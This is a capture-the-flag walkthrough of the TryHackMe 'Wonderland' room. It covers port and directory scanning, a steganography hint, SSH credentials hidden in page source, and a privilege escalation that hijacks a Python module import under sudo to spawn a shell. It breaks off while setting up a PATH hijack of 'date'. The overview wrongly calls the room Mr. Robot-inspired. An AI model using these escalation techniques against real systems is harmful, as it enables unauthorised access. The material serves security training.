# TryHackMe - Wonderland

![Logo](https://github.com/user-attachments/assets/547071c6-49b1-4172-ad33-960a085d72b2)



## Room Info
- **Difficulty:** Medium

- **Category:** 
- **Tags:** 
- **Link:** 

## Challenge Overview

This challenge is inspired by the *Mr. Robot* TV series and focuses on basic web enumeration and exploitation techniques. The goal is to discover hidden resources on a web server, extract sensitive information, and progressively gain access by leveraging common misconfigurations and weak credentials.

## Flag 1
First, we scan the target.
```
root@ip-10-64-116-46:~# nmap -sS -sV 10.64.163.31
Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-09 05:31 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.64.163.31
Host is up (0.00048s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.60 seconds
```

Then, we browse the website and it says us continuously that 'Follow the White Rabbit.'

We are performing a usual directory enumerate scan.

```
root@ip-10-64-116-46:~/wonder# gobuster dir -u http://10.64.163.31 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -q
/img                  (Status: 301) [Size: 0] [--> img/]
/r                    (Status: 301) [Size: 0] [--> r/]
/poem                 (Status: 301) [Size: 0] [--> poem/]
/http%3A%2F%2Fwww     (Status: 301) [Size: 0] [--> /http:/www]
/http%3A%2F%2Fyoutube (Status: 301) [Size: 0] [--> /http:/youtube]
/http%3A%2F%2Fblogs   (Status: 301) [Size: 0] [--> /http:/blogs]
/http%3A%2F%2Fblog    (Status: 301) [Size: 0] [--> /http:/blog]
/**http%3A%2F%2Fwww   (Status: 301) [Size: 0] [--> /%2A%2Ahttp:/www]
/http%3A%2F%2Fcommunity (Status: 301) [Size: 0] [--> /http:/community]
/http%3A%2F%2Fradar   (Status: 301) [Size: 0] [--> /http:/radar]
/http%3A%2F%2Fjeremiahgrossman (Status: 301) [Size: 0] [--> /http:/jeremiahgrossman]
/http%3A%2F%2Fweblog  (Status: 301) [Size: 0] [--> /http:/weblog]
/http%3A%2F%2Fswik    (Status: 301) [Size: 0]
```
There are 3 photo files in the img directory.
`alice_door.jpg`
`alice_door.png`
`white_rabbit_1.jpg`

We can get something out of JPGs in particular. That's why we'll download them and check if there is any metadata or hidden files.
```
root@ip-10-64-116-46:~/wonder# steghide extract -sf white_rabbit_1.jpg
Enter passphrase: 
wrote extracted data to "hint.txt".
root@ip-10-64-116-46:~/wonder# cat hint.txt 
follow the r a b b i t
```
Based on this clue, we will proceed from the /r in the gobuster result as /r -> /r/a -> /r/a/b.

http://ATTACK_MACHINE/r/a/b/b/i/t:
```
<!DOCTYPE html>

<head>
    <title>Enter wonderland</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>

<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you\u2019re sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
    </p>
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they\u2019re both mad."</p>
    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
</body>
```
`<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>`

In the source code of last page we see the credentials for the ssh. Now we are in!

```
alice@wonderland:~$ pwd
/home/alice
alice@wonderland:~$ ls -l
total 8
-rw------- 1 root root   66 May 25  2020 root.txt
-rw-r--r-- 1 root root 3577 May 25  2020 walrus_and_the_carpenter.py
```

We are searching for user.txt. But find can't find it(ironicly).

At this point CTF gives us a hint "Everything is upside down here." I think this hint means that the root.txt file is in the user home directory and the user.txt file is in the /root directory.

Therefore, we can obtain the first flag with `cat /root/user.txt`. (But this part isn't very important, we'll become root soon anyway.)

## Flag 2
Let's see how we can escalate our privilage.

```
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
Looks like we will use that Python script.

```
alice@wonderland:~$ cat walrus_and_the_carpenter.py 
import random
poem = """The sun was shining on the sea,
Shining with all his might:
[...]
[...]
[...]
And that was scarcely odd, because
They\u2019d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```
It's interesting that it imports the random module, rather than the script itself. Since the full path isn't specified, we can write a script called random.py in the same directory and run it as Rabbit.
```
alice@wonderland:~$ cat random.py
import os

os.system("/bin/bash")
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$
```

```
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Mon, 09 Feb 2026 07:53:55 +0000
Ask very nicely, and I will give you some tea while you wait for him

```
We import the file into our Kali machine to perform reverse engineering.
```
root@ip-10-64-116-46:~# strings teaParty 
/lib64/ld-linux-x86-64.so.2
2U~4
libc.so.6
setuid
puts
getchar
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
```
`/bin/echo -n 'Probably by ' && date --date='next hour' -R` Here we see that the `date` command is used without specifying the full path. We apply the same tactic.
